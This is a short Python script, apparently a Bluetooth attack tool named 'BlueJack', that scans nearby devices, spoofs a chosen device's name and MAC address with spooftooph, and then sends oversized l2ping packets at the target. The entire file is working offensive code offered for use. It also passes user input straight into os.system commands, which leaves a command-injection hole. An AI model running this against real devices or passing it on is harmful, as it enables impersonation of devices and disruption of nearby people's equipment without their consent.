#!/usr/bin/python
import sys, os, time, subprocess
from bluetooth import *

start_blue = 'service bluetooth start'
print ("ENABLING BLUETOOTH SERVICE [OK]")
time.sleep(2)
os.system(start_blue)

config = 'hciconfig'

os.system(config)
print ('CHOOSE YOUR INTERFACE [OK]')
interface = raw_input('BlueJack>')
os.system('hciconfig ' + interface + ' up')
print ("SCANNING [WAIT]")
nearby_devices = discover_devices(lookup_names = True)

print "found %d devices" % len(nearby_devices)

for name, addr in nearby_devices:
     print "|Address: %s | Name: %s |" % (name, addr)

print ("ENTER DEVICE NAME\n")
spoofmacname = raw_input('BlueJack>')
print ("ENTER DEVICE ADDRESS\n")
spoofmac = raw_input('BlueJack>')
print ("SPOOFING BLUETOOTH DEVICE [OK]\n")
time.sleep(0.5)
os.system('spooftooph -i ' + interface + ' -a ' + spoofmac +' -n ' + spoofmacname + '')
os.system('l2ping -i ' + interface + ' -s 600 ' + spoofmac + '')
